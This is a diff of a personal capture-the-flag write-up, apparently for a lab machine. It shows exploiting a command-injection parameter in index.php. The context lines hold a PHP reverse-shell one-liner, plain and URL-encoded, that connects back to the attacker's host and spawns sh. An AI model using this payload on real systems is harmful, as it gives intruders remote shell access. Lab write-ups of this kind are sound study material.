@@ -60,7 +60,6 @@ MAC Address: 02:B3:8F:7B:A4:5B (Unknown)
 </br> it's easier to copy this junk from the field in inspector
 ![copyeasierInInspector](https://github.com/user-attachments/assets/ddabee53-4f5f-44e6-bc24-3f79ece04d2e)
 
-
 </br> also read `ls -la content`
 </br> dG90YWwgMj (omitted) zcwo=
 </br> encrypted, with the = at the end looks like base64
@@ -75,12 +74,12 @@ MAC Address: 02:B3:8F:7B:A4:5B (Unknown)
 ```
 http://10.10.254.41/assets/index.php?cmd=php -r '$sock=fsockopen("10.10.105.73", 1984);exec("sh <&3 >&3 2>&3");'
 ```
-![revshellurlEncode](https://github.com/user-attachments/assets/6a0b0861-e3a3-4909-9193-c997e8e3f368)
 
 </br> dang it, doesn't work....
 </br> I need to go to revshells.com and url encode this junk...
 </br> It's a command injection, so that should be a PHP exec situation.
 </br> (different IP because new session started, dumb timeouts...)
+![revshellurlEncode](https://github.com/user-attachments/assets/6a0b0861-e3a3-4909-9193-c997e8e3f368)
 
 http://10.10.4.218/assets/index.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.10.152.50%22%2C1984)%3Bexec(%22sh%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
 ![revshellurlEncode](https://github.com/user-attachments/assets/707d75d4-eb4a-49c4-b498-4af114246678)
